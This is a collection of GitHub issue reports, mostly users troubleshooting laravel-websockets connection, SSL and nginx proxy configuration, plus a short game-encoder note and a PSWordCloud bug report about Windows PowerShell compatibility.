Then the Carddatamanager needs to be given to the gamestateencoder so it knows how to structure the input layer.
Actually the CardDatamanager combined with Gamestateencoder could eventually be able to dynamically calculate the input layer size so we can generate the network graphs dynamically.

The hardcoding that is going on right now in the encoder is temporary and won't be good when it comes time to scale.             
<---------->
158374929
i tried many ways and i couldn't use this package with my project 
located in Hoemstead 
Any Help please First, love this package.  I have been struggling to get this to work publicly.  I have it working on Domain/LAN.  However, when I go to use over public web I get the following errors in the chrome console. 

WebSocket is closed before the connection is established.
Error in connection establishment: net::ERR_CONNECTION_TIMED_OUT
WebSocket opening handshake timed out

 I think we have the public firewall working.  The traffic is routed through a Windows Reverse Proxy (ARR).  I have opened port 6001 on the firewall for in and out traffic.  I have a wss rule in the proxy in it appears to test successful.  Just be fair, I am not 100 sure if the traffic is making to the ARR from the Public Firewall.  We need to do some further troubleshooting there.

Our DNS is setup using godaddy.  Do you have to set a special SRV record to get ws wss traffic to work correctly?  Sorry if this the wrong place for this question. First of all thank you for your great work.

I'm using your package for a few days and after some test, I could connect to my dashboard with connection to websocket.

In next step I create an event name `NewQuestion`  that have a very simple event for test:

```
class NewQuestion implements ShouldBroadcast
{
    use Dispatchable, InteractsWithSockets, SerializesModels;

    public $message;
    /**
     * Create a new event instance.
     *
     * @return void
     */
    public function __construct($message)
    {
        $this->message = $message;
    }

    /**
     * Get the channels the event should broadcast on.
     *
     * @return \Illuminate\Broadcasting\Channel|array
     */
    public function broadcastOn()
    {
        return new PrivateChannel('moderator');
    }
}
```

When I simply call my event after new question store in `QuestionController` , laravel says:

> 
>  Illuminate \ Broadcasting \ BroadcastException
> No message


**and this is part of laravel report:** 

>        $response = $this->pusher->trigger(
>             $this->formatChannels($channels), $event, $payload, $socket, true
>         );
>  
>         if ((is_array($response) && $response['status'] >= 200 && $response['status'] <= 299)
>             || $response === true) {
>             return;
>         }
>  
>         throw new BroadcastException(
>             is_bool($response) ? 'Failed to connect to Pusher.' : $response['body']
>         );
>     }
>  
>     /**
>      * Get the Pusher SDK instance.
>      *
>      * @return \Pusher\Pusher
>      */
>     public function getPusher()
>     {
>         return $this->pusher;
>     }
> }

***Would you please let me know what wrong in my case?***

my configurations:

**broadcasting.php:**

```
        'pusher' => [
            'driver' => 'pusher',
            'key' => env('PUSHER_APP_KEY'),
            'secret' => env('PUSHER_APP_SECRET'),
            'app_id' => env('PUSHER_APP_ID'),
            'options' => [
                'cluster' => env('PUSHER_APP_CLUSTER'),
                'encrypted' => true,
                'host' => '127.0.0.1',
                'port' => 6001,
                'scheme' => 'https'
            ],
        ],
```


**websockets.php:**

```
    'apps' => [
        [
            'id' => env('PUSHER_APP_ID'),
            'name' => env('APP_NAME'),
            'key' => env('PUSHER_APP_KEY'),
            'secret' => env('PUSHER_APP_SECRET'),
            'enable_client_messages' => false,
            'enable_statistics' => true,
        ],
    ],
.
.
.
          'local_cert' => '/home/myDomain/domains/myDomain.com/private_html/local.cert',
.
.
.
        'local_pk' => '/home/myDomain/domains/myDomain.com/private_html/key.cert',
.
.
.

```



 hello, I'm trying to use this excellent package in an app outside the laravel with quasar but at the time of connecting generates this error
Firefox could not establish a connection to the server in ws: //socialcore.jet/: 6001 / app / secretus? Protocol = 7 & client = js & version = 4.4.0 & flash = false ..
any clue why this is happening First off awesome stuff!! 

I am trying to create a websocket server running on my homestead vm with SSL. I followed this guide to setup the same configuration in GCP using forge (https://alex.bouma.dev/installing-laravel-websockets-on-forge/#what-about-cloudflare). Everything seems to be configured the same way except for the websocket server does not seem to receiving any request on the port that it is listening on. I need this configuration because I am utilizing webrtc and require an https connection to gain access to devices (cameras, mic, speakers). Here is an image to show that chrome views this as valid SSL

![image](https://user-images.githubusercontent.com/25642759/56312194-a9aace00-611d-11e9-9c18-3bfb3958631c.png)

However, I am getting this error:

![image](https://user-images.githubusercontent.com/25642759/56312528-4f5e3d00-611e-11e9-91a3-658628c5d73d.png)


This is my configuration:

websockets.php:
```
<?php

use BeyondCode\LaravelWebSockets\Dashboard\Http\Middleware\Authorize;

return [

    /*
     * This package comes with multi tenancy out of the box. Here you can
     * configure the different apps that can use the webSockets server.
     *
     * Optionally you can disable client events so clients cannot send
     * messages to each other via the webSockets.
     */
    'apps' => [
        [
            'id' => env('PUSHER_APP_ID'),
            'name' => env('APP_NAME'),
            'key' => env('PUSHER_APP_KEY'),
            'secret' => env('PUSHER_APP_SECRET'),
            'enable_client_messages' => false,
            'enable_statistics' => true,
        ],
    ],

    /*
     * This class is responsible for finding the apps. The default provider
     * will use the apps defined in this config file.
     *
     * You can create a custom provider by implementing the
     * `AppProvider` interface.
     */
    'app_provider' => BeyondCode\LaravelWebSockets\Apps\ConfigAppProvider::class,

    /*
     * This array contains the hosts of which you want to allow incoming requests.
     * Leave this empty if you want to accept requests from all hosts.
     */
    'allowed_origins' => [
        //
    ],

    /*
     * The maximum request size in kilobytes that is allowed for an incoming WebSocket request.
     */
    'max_request_size_in_kb' => 250,

    /*
     * This path will be used to register the necessary routes for the package.
     */
    'path' => 'websockets',

    /*
     * Dashboard Routes Middleware
     *
     * These middleware will be assigned to every dashboard route, giving you
     * the chance to add your own middleware to this list or change any of
     * the existing middleware. Or, you can simply stick with this list.
     */
    'middleware' => [
        'web',
        Authorize::class,
    ],

    'statistics' => [
        /*
         * This model will be used to store the statistics of the WebSocketsServer.
         * The only requirement is that the model should extend
         * `WebSocketsStatisticsEntry` provided by this package.
         */
        'model' => \BeyondCode\LaravelWebSockets\Statistics\Models\WebSocketsStatisticsEntry::class,

        /*
         * Here you can specify the interval in seconds at which statistics should be logged.
         */
        'interval_in_seconds' => 20,

        /*
         * When the clean-command is executed, all recorded statistics older than
         * the number of days specified here will be deleted.
         */
        'delete_statistics_older_than_days' => 60,

        /*
         * Use an DNS resolver to make the requests to the statistics logger
         * default is to resolve everything to 127.0.0.1.
         */
        'perform_dns_lookup' => false,
    ],

    /*
     * Define the optional SSL context for your WebSocket connections.
     * You can see all available options at: http://php.net/manual/en/context.ssl.php
     */
    'ssl' => [
        /*
         * Path to local certificate file on filesystem. It must be a PEM encoded file which
         * contains your certificate and private key. It can optionally contain the
         * certificate chain of issuers. The private key also may be contained
         * in a separate file specified by local_pk.
         */
        'local_cert' => '',

        /*
         * Path to local private key file on filesystem in case of separate files for
         * certificate (local_cert) and private key.
         */
        'local_pk' => '',

        /*
         * Passphrase for your local_cert file.
         */
        'passphrase' => null,
    ],

    /*
     * Channel Manager
     * This class handles how channel persistence is handled.
     * By default, persistence is stored in an array by the running webserver.
     * The only requirement is that the class should implement
     * `ChannelManager` interface provided by this package.
     */
    'channel_manager' => \BeyondCode\LaravelWebSockets\WebSockets\Channels\ChannelManagers\ArrayChannelManager::class,
];

```

echo config:

```
window.Echo = new Echo({
    broadcaster: 'pusher',
    key: process.env.MIX_PUSHER_APP_KEY,
    wsHost: window.location.hostname,
    wssPort: 6002,
    wsPort: 6002,
    disableStats: false,
    encrypted: true,
    enabledTransports: ['ws', 'wss'],
});
```

broadcasting config:


```
'pusher' => [
            'driver' => 'pusher',
            'key' => env('PUSHER_APP_KEY'),
            'secret' => env('PUSHER_APP_SECRET'),
            'app_id' => env('PUSHER_APP_ID'),
            'options' => [
                'cluster' => env('PUSHER_APP_CLUSTER'),
                'encrypted' => true,
                'host' => '127.0.0.1',
                'port' => 6001,
                'scheme' => 'http'
            ],
        ],
```


nginx conf (which is not configured because I have attempted so many different ways)


```
server {
    listen 80;
    listen 443 ssl http2;
    server_name .domain.test;
    root "/home/vagrant/domain/public";

    index index.html index.htm index.php;

    charset utf-8;



    location / {
        try_files $uri $uri/ /index.php?$query_string;

      add_header 0 false;
    }




    location = /favicon.ico { access_log off; log_not_found off; }
    location = /robots.txt  { access_log off; log_not_found off; }

    access_log off;
    error_log  /var/log/nginx/domain.test-error.log error;

    sendfile off;

    client_max_body_size 100m;

    location ~ \.php$ {
        fastcgi_split_path_info ^(.+\.php)(/.+)$;
        fastcgi_pass unix:/var/run/php/php7.2-fpm.sock;
        fastcgi_index index.php;
        include fastcgi_params;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;


        fastcgi_intercept_errors off;
        fastcgi_buffer_size 16k;
        fastcgi_buffers 4 16k;
        fastcgi_connect_timeout 300;
        fastcgi_send_timeout 300;
        fastcgi_read_timeout 300;
    }

    location ~ /\.ht {
        deny all;
    }

    ssl_certificate     /etc/nginx/ssl/domain.test.crt;
    ssl_certificate_key /etc/nginx/ssl/domain.test.key;
}
```


However following the guide it recommends:


```
# FORGE CONFIG (DO NOT REMOVE!)
include forge-conf/laravel-websockets-example.alexbouma.me/before/*;

server {
    listen 443 ssl;
    listen [::]:443 ssl;
    server_name laravel-websockets-example.alexbouma.me;
    root /home/forge/laravel-websockets-example.alexbouma.me/public;

    # FORGE SSL (DO NOT REMOVE!)
    ssl_certificate /etc/nginx/ssl/laravel-websockets-example.alexbouma.me/473558/server.crt;
    ssl_certificate_key /etc/nginx/ssl/laravel-websockets-example.alexbouma.me/473558/server.key;

    ssl_protocols TLSv1.2;
    ssl_ciphers ECDHE-RSA-AES256-GCM-SHA512:DHE-RSA-AES256-GCM-SHA512:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-SHA384;
    ssl_prefer_server_ciphers on;
    ssl_dhparam /etc/nginx/dhparams.pem;

    add_header X-Frame-Options "SAMEORIGIN";
    add_header X-XSS-Protection "1; mode=block";
    add_header X-Content-Type-Options "nosniff";

    index index.html index.htm index.php;

    charset utf-8;

    # FORGE CONFIG (DO NOT REMOVE!)
    include forge-conf/laravel-websockets-example.alexbouma.me/server/*;

    location / {
        try_files $uri $uri/ /index.php?$query_string;
    }

    location = /favicon.ico { access_log off; log_not_found off; }
    location = /robots.txt  { access_log off; log_not_found off; }

    access_log off;
    error_log  /var/log/nginx/laravel-websockets-example.alexbouma.me-error.log error;

    error_page 404 /index.php;

    location ~ \.php$ {
        fastcgi_split_path_info ^(.+\.php)(/.+)$;
        fastcgi_pass unix:/var/run/php/php7.1-fpm.sock;
        fastcgi_index index.php;
        include fastcgi_params;
    }

    location ~ /\.(?!well-known).* {
        deny all;
    }
}

server {
    listen 6002 ssl;
    listen [::]:6002 ssl;
    server_name laravel-websockets-example.alexbouma.me;
    root /home/forge/laravel-websockets-example.alexbouma.me/public;

    # FORGE SSL (DO NOT REMOVE!)
    ssl_certificate /etc/nginx/ssl/laravel-websockets-example.alexbouma.me/473558/server.crt;
    ssl_certificate_key /etc/nginx/ssl/laravel-websockets-example.alexbouma.me/473558/server.key;

    ssl_protocols TLSv1.2;
    ssl_ciphers ECDHE-RSA-AES256-GCM-SHA512:DHE-RSA-AES256-GCM-SHA512:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-SHA384;
    ssl_prefer_server_ciphers on;
    ssl_dhparam /etc/nginx/dhparams.pem;

    add_header X-Frame-Options "SAMEORIGIN";
    add_header X-XSS-Protection "1; mode=block";
    add_header X-Content-Type-Options "nosniff";

    index index.html index.htm index.php;

    charset utf-8;

    # FORGE CONFIG (DO NOT REMOVE!)
    include forge-conf/laravel-websockets-example.alexbouma.me/server/*;

    location / {
        proxy_pass             http://127.0.0.1:6001;
        proxy_read_timeout     60;
        proxy_connect_timeout  60;
        proxy_redirect         off;
        
        # Allow the use of websockets
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_cache_bypass $http_upgrade;
    }

    location = /favicon.ico { access_log off; log_not_found off; }
    location = /robots.txt  { access_log off; log_not_found off; }

    access_log off;
    error_log  /var/log/nginx/laravel-websockets-example.alexbouma.me-error.log error;

    error_page 404 /index.php;

    location ~ \.php$ {
        fastcgi_split_path_info ^(.+\.php)(/.+)$;
        fastcgi_pass unix:/var/run/php/php7.1-fpm.sock;
        fastcgi_index index.php;
        include fastcgi_params;
    }

    location ~ /\.(?!well-known).* {
        deny all;
    }
}

# FORGE CONFIG (DO NOT REMOVE!)
include forge-conf/laravel-websockets-example.alexbouma.me/after/*;

```

However I am not sure how to apply that same config to a local homestead vm. Thanks in advanced and let me know if I can supply any more information. I've suddenly see these errors pop-up in my console:

`Access to XMLHttpRequest at 'http://sockjs.pusher.com/pusher/app/my-key/239/2b418tpp/xhr?protocol=7&client=js&version=4.4.0&t=1556704320239&n=2' from origin 'http://localhost:3000' has been blocked by CORS policy: Response to preflight request doesn't pass access control check: No 'Access-Control-Allow-Origin' header is present on the requested resource.`

`OPTIONS http://sockjs.pusher.com/pusher/app/my-key/239/2b418tpp/xhr?protocol=7&client=js&version=4.4.0&t=1556704320239&n=2 404 (Not Found)`

`ws://localhost:6001/app/my-key?protocol=7&client=js&version=4.4.0&flash=false' failed: Error in connection establishment: net::ERR_CONNECTION_REFUSED`

`wss://localhost/app/my-key?protocol=7&client=js&version=4.4.0&flash=false' failed: Error during WebSocket handshake: Unexpected response code: 404`

Those 4 keep coming back on each retry.

Here's my broadcasting.php
```
'pusher' => [
            'driver' => 'pusher',
            'key' => env('PUSHER_APP_KEY'),
            'secret' => env('PUSHER_APP_SECRET'),
            'app_id' => env('PUSHER_APP_ID'),
            'options' => [
                'cluster' => env('PUSHER_APP_CLUSTER'),
                'encrypted' => true,
                'host' => '127.0.0.1',
                'port' => 6001,
                'scheme' => 'http'
            ],
        ],
```

And bootstrap.js Echo configuration:
```
window.Echo = new Echo({
    broadcaster: 'pusher',
    key: process.env.MIX_PUSHER_APP_KEY,
    wsHost: window.location.hostname,
    wsPort: 6001,
    disableStats: true,
});
```

Any idea if this is something I would've broken myself? Only thing I recall doing which could lead to issues is that I updated my composer dependencies together with Laravel 5.8. Hi, I'm trying to connect websocket on real application server, but I stuck. Websocket and the web content is in the same place. I don't get it actually where is the problem. My browser saying ERR_CONNECTION_TIMED_OUT in console log. Screen shot in the below. What am i doing wrong ?

![Screen Shot 2019-04-08 at 18 12 42](https://user-images.githubusercontent.com/15131564/55736211-8d2ad980-5a2b-11e9-89f5-bf81b8821767.png)

My Laravel Echo config:

```
window.Echo = new Echo({
    broadcaster: 'pusher',
    key: process.env.MIX_PUSHER_APP_KEY,
    wsHost: window.location.hostname,
    wsPort: 6001,
    wssPort: 6001,
    disableStats: true,
    encrypted: true,
    enabledTransports: ['ws', 'wss'],
});
```

My NGINX config file looks like:

```
map $http_upgrade $type {
  default "web";
  websocket "ws";
}

server {
        # Listen HTTP
        listen 80;
        listen [::]:80;

        # Server Name
        server_name hidden-domain.com;

        # Redirect to HTTPS
        return 301 https://hidden-domain.com$request_uri;
}

server {
        # Listen SSL
        listen 443 ssl http2 deferred;
        listen [::]:443 ssl http2 deferred;

        # SSL Certificates
        ssl_certificate /etc/nginx/ssl/app.pem;
        ssl_certificate_key /etc/nginx/ssl/app.key;

        # SSL Config
        include h5bp/ssl/ssl_engine.conf;
        include h5bp/ssl/policy_intermediate.conf;

        # Include the basic h5bp config set
        include h5bp/basic.conf;

        # Root
        root /var/www/app/public;

        # Start Files
        index index.html index.php;

        # Server Name
        server_name hidden-domain.com;

        # Root directory
        location / {
                try_files /nonexistent @$type;
        }

        location @web {
                try_files $uri $uri/ /index.php?$query_string;
        }

        location @ws {
                proxy_pass             http://127.0.0.1:6001;
                proxy_set_header Host  $host;
                proxy_read_timeout     60;
                proxy_connect_timeout  60;
                proxy_redirect         off;
                # Allow the use of websockets
                proxy_http_version 1.1;
                proxy_set_header Upgrade $http_upgrade;
                proxy_set_header Connection 'upgrade';
                proxy_set_header Host $host;
                proxy_cache_bypass $http_upgrade;
        }

        # PHP FPM
        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/var/run/php/php7.2-fpm.sock;
        }

        # Deny htaccess
        location ~ /\.ht {
                deny all;
        }
}
```

broadcasting.php

```
'pusher' => [
            'driver' => 'pusher',
            'key' => env('PUSHER_APP_KEY'),
            'secret' => env('PUSHER_APP_SECRET'),
            'app_id' => env('PUSHER_APP_ID'),
            'options' => [
                'cluster' => env('PUSHER_APP_CLUSTER'),
                'encrypted' => true,
                'host' => '127.0.0.1',
                'port' => 6001,
                'scheme' => 'https',
            ],
        ],
```

websockets.php
```
'ssl' => [
        /*
         * Path to local certificate file on filesystem. It must be a PEM encoded file which
         * contains your certificate and private key. It can optionally contain the
         * certificate chain of issuers. The private key also may be contained
         * in a separate file specified by local_pk.
         */
        'local_cert' => '/etc/nginx/ssl/app.pem',

        /*
         * Path to local private key file on filesystem in case of separate files for
         * certificate (local_cert) and private key.
         */
        'local_pk' => '/etc/nginx/ssl/app.key',

        /*
         * Passphrase for your local_cert file.
         */
        'passphrase' => null,
    ],
``` Hi, I'm trying to connect websocket on real application server, but I stuck. Websocket and the web content is in the same place. I don't get it actually where is the problem. My browser saying ERR_CONNECTION_TIMED_OUT in console log. Screen shot in the below. What am i doing wrong ?

![Screen Shot 2019-04-08 at 18 12 42](https://user-images.githubusercontent.com/15131564/55736211-8d2ad980-5a2b-11e9-89f5-bf81b8821767.png)

My Laravel Echo config:

```
window.Echo = new Echo({
    broadcaster: 'pusher',
    key: process.env.MIX_PUSHER_APP_KEY,
    wsHost: window.location.hostname,
    wsPort: 6001,
    wssPort: 6001,
    disableStats: true,
    encrypted: true,
    enabledTransports: ['ws', 'wss'],
});
```

My NGINX config file looks like:

```
map $http_upgrade $type {
  default "web";
  websocket "ws";
}

server {
        # Listen HTTP
        listen 80;
        listen [::]:80;

        # Server Name
        server_name hidden-domain.com;

        # Redirect to HTTPS
        return 301 https://hidden-domain.com$request_uri;
}

server {
        # Listen SSL
        listen 443 ssl http2 deferred;
        listen [::]:443 ssl http2 deferred;

        # SSL Certificates
        ssl_certificate /etc/nginx/ssl/app.pem;
        ssl_certificate_key /etc/nginx/ssl/app.key;

        # SSL Config
        include h5bp/ssl/ssl_engine.conf;
        include h5bp/ssl/policy_intermediate.conf;

        # Include the basic h5bp config set
        include h5bp/basic.conf;

        # Root
        root /var/www/app/public;

        # Start Files
        index index.html index.php;

        # Server Name
        server_name hidden-domain.com;

        # Root directory
        location / {
                try_files /nonexistent @$type;
        }

        location @web {
                try_files $uri $uri/ /index.php?$query_string;
        }

        location @ws {
                proxy_pass             http://127.0.0.1:6001;
                proxy_set_header Host  $host;
                proxy_read_timeout     60;
                proxy_connect_timeout  60;
                proxy_redirect         off;
                # Allow the use of websockets
                proxy_http_version 1.1;
                proxy_set_header Upgrade $http_upgrade;
                proxy_set_header Connection 'upgrade';
                proxy_set_header Host $host;
                proxy_cache_bypass $http_upgrade;
        }

        # PHP FPM
        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/var/run/php/php7.2-fpm.sock;
        }

        # Deny htaccess
        location ~ /\.ht {
                deny all;
        }
}
``` i can access my shared hosting with ssh but i have this error after running php artisan websockets:serve

>>WebSocket connection to 'ws://test.codeixi.com:6001/app/websocketkey?protocol=7&client=js&version=4.3.1&flash=false' failed: WebSocket is closed before the connection is established.

>>app.js:37780 WebSocket connection to 'wss://test.codeixi.com/app/websocketkey?protocol=7&client=js&version=4.3.1&flash=false' failed: Error in connection establishment: net::ERR_CERT_AUTHORITY_INVALID Thanks for making this package - it seems well made - i needed to try it after the demo at LaraconOnline.

A small note/suggestion on the settings suggested in the documentation.

Reference in the documentation: 
https://docs.beyondco.de/laravel-websockets/1.0/basic-usage/pusher.html#requirements

Here you set 'encrypted' => true and 'scheme' => 'http' - which at first glance seems contradictory.

With this setting it will try to connect to wss://.... websockets with SSL, and not ws://...which is without SSL.

My suggestion would be to have 'encrypted' => false and then those who move on with the package can configure SSL. Many developers uses SSL locally, but many don't.

I spent 20-30 minutes troubleshooting before i realized that this was the only thing making my test app to fail. :)

Thanks again.
 I am using JavaScript WebSocket and sending an event to the socket server of Laravel. I am not getting how can I listen to that event on Laravel?

And it through the error when the client sends a message to the socket server.

Sending the message to socket server by javascript:
`var socket = new WebSocket('ws://site-url:6001/app/pusher-app-key');
socket.send('hello');`

Error on socket server:
http://prntscr.com/n2gnvb Hi,

I'm trying to use Laravel Websockets to create something similar to the Google Analytics Realtime.

All I need to do is log when someone connects and when they disconnect.

Now, obviously I can use presence channels, but as I understand it these are for authorized users only. I want to find out when any user (authorized or otherwise) connects/disconnects.

I tried hooking into Echo and can send an Ajax request when they connect, this works but obviously the disconnect event doesn't fire when they, say, close the window/tab.

So I looked into doing this on the server side. From what I can see Laravel Websockets doesn't have any Laravel events we can hook into with a listener which would probably work. So I tried adding a rudimentary event call in `Websockets\WebSocketHandler\WebSocketHandler.php` which works:

`onClose` method:

    public function onClose(ConnectionInterface $connection)
    {
        $this->channelManager->removeFromAllChannels($connection);

        DashboardLogger::disconnection($connection);

        StatisticsLogger::disconnection($connection);

        // Fire event for tracking status.
        event(new \App\Events\WebsocketsStatusEvent('disconnected'));
    }

`establishConnection` method:

    protected function establishConnection(ConnectionInterface $connection)
    {
        $connection->send(json_encode([
            'event' => 'pusher:connection_established',
            'data' => json_encode([
                'socket_id' => $connection->socketId,
                'activity_timeout' => 30,
            ]),
        ]));

        DashboardLogger::connection($connection);

        StatisticsLogger::connection($connection);

        // Fire event for tracking status.
        event(new \App\Events\WebsocketsStatusEvent('connected'));

        return $this;
    }

This example is pretty basic but I'm assuming we can send the socket ID and status to event which we could hook into with the EventServiceProvider.

Is this something that could be added or am I just being stupid here? First of all thank you for your great work.

I'm using your package for a few days and after some test, I could connect to my dashboard with connection to websocket.

In next step I create an event name `NewQuestion`  that have a very simple event for test:

```
class NewQuestion implements ShouldBroadcast
{
    use Dispatchable, InteractsWithSockets, SerializesModels;

    public $message;
    /**
     * Create a new event instance.
     *
     * @return void
     */
    public function __construct($message)
    {
        $this->message = $message;
    }

    /**
     * Get the channels the event should broadcast on.
     *
     * @return \Illuminate\Broadcasting\Channel|array
     */
    public function broadcastOn()
    {
        return new PrivateChannel('moderator');
    }
}
```

When I simply call my event after new question store in `QuestionController` , laravel says:

> 
>  Illuminate \ Broadcasting \ BroadcastException
> No message


**and this is part of laravel report:** 

>        $response = $this->pusher->trigger(
>             $this->formatChannels($channels), $event, $payload, $socket, true
>         );
>  
>         if ((is_array($response) && $response['status'] >= 200 && $response['status'] <= 299)
>             || $response === true) {
>             return;
>         }
>  
>         throw new BroadcastException(
>             is_bool($response) ? 'Failed to connect to Pusher.' : $response['body']
>         );
>     }
>  
>     /**
>      * Get the Pusher SDK instance.
>      *
>      * @return \Pusher\Pusher
>      */
>     public function getPusher()
>     {
>         return $this->pusher;
>     }
> }

***Would you please let me know what wrong in my case?***

my configurations:

**broadcasting.php:**

```
        'pusher' => [
            'driver' => 'pusher',
            'key' => env('PUSHER_APP_KEY'),
            'secret' => env('PUSHER_APP_SECRET'),
            'app_id' => env('PUSHER_APP_ID'),
            'options' => [
                'cluster' => env('PUSHER_APP_CLUSTER'),
                'encrypted' => true,
                'host' => '127.0.0.1',
                'port' => 6001,
                'scheme' => 'https'
            ],
        ],
```


**websockets.php:**

```
    'apps' => [
        [
            'id' => env('PUSHER_APP_ID'),
            'name' => env('APP_NAME'),
            'key' => env('PUSHER_APP_KEY'),
            'secret' => env('PUSHER_APP_SECRET'),
            'enable_client_messages' => false,
            'enable_statistics' => true,
        ],
    ],
.
.
.
          'local_cert' => '/home/myDomain/domains/myDomain.com/private_html/local.cert',
.
.
.
        'local_pk' => '/home/myDomain/domains/myDomain.com/private_html/key.cert',
.
.
.

```



  Hi,

I'm trying to use Laravel Websockets to create something similar to the Google Analytics Realtime.

All I need to do is log when someone connects and when they disconnect.

Now, obviously I can use presence channels, but as I understand it these are for authorized users only. I want to find out when any user (authorized or otherwise) connects/disconnects.

I tried hooking into Echo and can send an Ajax request when they connect, this works but obviously the disconnect event doesn't fire when they, say, close the window/tab.

So I looked into doing this on the server side. From what I can see Laravel Websockets doesn't have any Laravel events we can hook into with a listener which would probably work. So I tried adding a rudimentary event call in `Websockets\WebSocketHandler\WebSocketHandler.php` which works:

`onClose` method:

    public function onClose(ConnectionInterface $connection)
    {
        $this->channelManager->removeFromAllChannels($connection);

        DashboardLogger::disconnection($connection);

        StatisticsLogger::disconnection($connection);

        // Fire event for tracking status.
        event(new \App\Events\WebsocketsStatusEvent('disconnected'));
    }

`establishConnection` method:

    protected function establishConnection(ConnectionInterface $connection)
    {
        $connection->send(json_encode([
            'event' => 'pusher:connection_established',
            'data' => json_encode([
                'socket_id' => $connection->socketId,
                'activity_timeout' => 30,
            ]),
        ]));

        DashboardLogger::connection($connection);

        StatisticsLogger::connection($connection);

        // Fire event for tracking status.
        event(new \App\Events\WebsocketsStatusEvent('connected'));

        return $this;
    }

This example is pretty basic but I'm assuming we can send the socket ID and status to event which we could hook into with the EventServiceProvider.

Is this something that could be added or am I just being stupid here? 'key'               => env('PUSHER_APP_KEY'),
'secret'            => env('PUSHER_APP_SECRET'),
'app_id'            => env('PUSHER_APP_ID'),

My understanding is I will be running my own pusher server, do I just make up whatever I want and put them in the .env file for those variables? Is it a good idea to use laravel task scheduler to check server is running?
Something like:

```
protected function schedule(Schedule $schedule)
{
   $schedule->command('websockets:start_if_not_running_custom_command')
   ->everyMinute();
}
```
And if yes, how can I check server running?
Thanks in advance!
 I would like to load some ws-specific middleware when starting the websockets server. Goal is to log connections within a database. As the database config is dynamic i would like to have a middleware which writes the connection details to config('database.connections'). Someone an idea how to accomblish this? I get the error: failed: WebSocket is closed before the connection is established.

![image](https://user-images.githubusercontent.com/5693741/68147372-8865cf80-feff-11e9-97f6-a7ce5b29c444.png)


I already checked many answers but I can't find the solution, I leave the codes.

 **websockets.php**  
 
![image](https://user-images.githubusercontent.com/5693741/68147950-b861a280-ff00-11e9-832c-70c716a43745.png)
![image](https://user-images.githubusercontent.com/5693741/68147970-c31c3780-ff00-11e9-8410-eb6f54b271bf.png)

**broadcasting.php**

![image](https://user-images.githubusercontent.com/5693741/68148045-e34bf680-ff00-11e9-8cdc-f1bf46a03a38.png)

**Bootstrap.js**
![image](https://user-images.githubusercontent.com/5693741/68148081-ed6df500-ff00-11e9-81fa-552bca9559ad.png)


> **Note**
> Already verify that port 6001 is open I'm getting this error. Its killing my time. I dig deep and found no proper solution for this issue. in **LOCAL SERVER its working fine **. but in **LIVE SERVER this issue arises.** 

I put 'local_pk'  and 'local_cert' both path inside websockets.php file

its my app.js file


window.Echo = new Echo({
    broadcaster: 'pusher',
    key: '1234567890',
    wsHost: window.location.hostname,
    wsPort: 6001,
    encrypted: false,
    wssPort: 6001,
    disableStats: true,
    enabledTransports: ['ws', 'wss'],
});


here is my broadcasing.hp config


    'connections' => [

        'pusher' => [
            'driver' => 'pusher',
            'key' => env('PUSHER_APP_KEY'),
            'secret' => env('PUSHER_APP_SECRET'),
            'app_id' => env('PUSHER_APP_ID'),
            'options' => [
                'cluster' => env('PUSHER_APP_CLUSTER'),
                'host' => '127.0.0.1',
                'encrypted' => false,
                'port' => 6001,
                'scheme' => 'https',
                'curl_options' => [
                    CURLOPT_SSL_VERIFYHOST => 0,
                    CURLOPT_SSL_VERIFYPEER => 0,
                ]
            ],
        ],


PLEASE HELP ME OUT.



<---------->
158657647
(n.b. not sure if current releases are meant to drop support for Windows PowerShell?)

The latest release uses a syntax on `Join-Path` that won't work in Windows PowerShell, and and automatic variable that also doesn't exist in Windows PowerShell.

Trying to import the module results in:

```
Join-Path : A positional parameter cannot be found that accepts argument 'SkiaSharp.dll'.
At C:\Users\Windos\Documents\WindowsPowerShell\Modules\pswordcloud\2.0.1\PSWordCloud.psm1:13 char:16
+ ... iaDllPath = Join-Path -Path $PSScriptRoot -ChildPath $PlatformFolder  ...
+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidArgument: (:) [Join-Path], ParameterBindingException
    + FullyQualifiedErrorId : PositionalParameterNotFound,Microsoft.PowerShell.Commands.JoinPathCommand

Add-Type : Cannot bind argument to parameter 'Path' because it is null.
At C:\Users\Windos\Documents\WindowsPowerShell\Modules\pswordcloud\2.0.1\PSWordCloud.psm1:15 char:16
+ Add-Type -Path $SkiaDllPath
+                ~~~~~~~~~~~~
    + CategoryInfo          : InvalidData: (:) [Add-Type], ParameterBindingValidationException
    + FullyQualifiedErrorId : ParameterArgumentValidationErrorNullNotAllowed,Microsoft.PowerShell.Commands.AddTypeCommand

Import-Module : Could not load file or assembly 'SkiaSharp, Version=1.68.0.0, Culture=neutral,
PublicKeyToken=0738eb9f132ed756' or one of its dependencies. The system cannot find the file specified.
At C:\Users\Windos\Documents\WindowsPowerShell\Modules\pswordcloud\2.0.1\PSWordCloud.psm1:16 char:1
+ Import-Module  "$PSScriptRoot\PSWordCloudCmdlet.dll"
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Import-Module], FileNotFoundException
    + FullyQualifiedErrorId : System.IO.FileNotFoundException,Microsoft.PowerShell.Commands.ImportModuleCommand
```

This is coming from this line in the psm1 file:

```powershell
$SkiaDllPath = Join-Path -Path $PSScriptRoot -ChildPath $PlatformFolder "SkiaSharp.dll"
```

Possible fixes are to change the child path to "$PlatformFolder\SkiaSharp.dll"` or two swap out `Join-Path` for `[http://System.IO .Path]::Combine()`

However, this change highlights a second issue, the switch statement for Platform  Folder selection relies on PowerShell Core as `$IsWindows` isn't a thing in Windows PowerShell.

```
Add-Type : Cannot bind parameter 'Path' to the target. Exception setting "Path": "Cannot find path
'C:\Users\Windos\Documents\WindowsPowerShell\Modules\pswordcloud\2.0.1\SkiaSharp.dll' because it does not exist."
